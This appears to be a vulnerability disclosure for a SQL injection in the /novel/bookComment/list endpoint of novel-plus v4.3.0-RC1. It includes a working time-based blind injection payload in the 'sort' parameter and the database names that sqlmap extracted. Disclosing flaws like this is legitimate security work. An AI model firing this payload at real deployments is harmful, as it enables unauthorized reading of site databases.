

# SQL injection vulnerability exists in novel-plus v4.3.0-RC1

## The /novel/bookComment/list interface of the novel-admin subsystem in the novel-plus system has SQL injection vulnerability.

#### official website: https://novel.xxyopen.com/index.htm
 
#### github: https://github.com/201206030/novel-plus
 
#### Affected version: v4.3.0-RC1
 
#### releases：https://github.com/201206030/novel-plus/releases/tag/v4.3.0-RC1
 

Payload: 
```
http://127.0.0.1:8088/novel/bookComment/list?limit=10&offset=0&sort=id AND (SELECT 9288 FROM (SELECT(SLEEP(5)))OHwd)&order=desc
```

Use sqlmap for verification, and retrieve all the database names.

使用sqlmap验证，跑出所有库名：

> information_schema<br>
> novel_plus

![image](https://github.com/red0-ha1yu/warehouse/assets/156632069/64a17292-94cb-493e-8bb2-e77895ed6aee)



![image](https://github.com/red0-ha1yu/warehouse/assets/156632069/f9e34958-d8b0-494b-bd2a-3d606ca34af7)


![image](https://github.com/red0-ha1yu/warehouse/assets/156632069/ac6e5abd-3a24-4bd5-959d-7e170ce86ddf)


![image](https://github.com/red0-ha1yu/warehouse/assets/156632069/a16fd9af-1316-429c-8638-4621896f33d2)

